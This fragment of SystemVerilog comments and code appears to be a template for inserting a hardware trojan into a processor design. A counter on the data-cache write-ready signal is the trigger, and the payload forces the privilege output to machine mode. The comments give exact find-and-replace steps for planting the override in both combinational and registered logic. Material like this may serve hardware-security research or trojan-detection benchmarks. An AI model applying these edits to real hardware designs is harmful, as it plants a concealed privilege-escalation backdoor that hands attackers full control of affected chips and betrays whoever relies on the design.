 ...
 *   
 * Trigger: Counter on dcache_mem_req_write_ready_i
 * Payload: Force hwpf_status_o to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (|dcache_mem_req_write_ready_i) begin
...
// ============================================================
// Privilege Escalation: Override hwpf_status_o to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If hwpf_status_o has a combinational assign:
//   Find:    assign hwpf_status_o = <priv_expr>;
//   Replace: assign hwpf_status_o = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If hwpf_status_o is updated inside always_ff:
//   Find the last assignment to hwpf_status_o in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) hwpf_status_o <= PRIV_LVL_M;
//
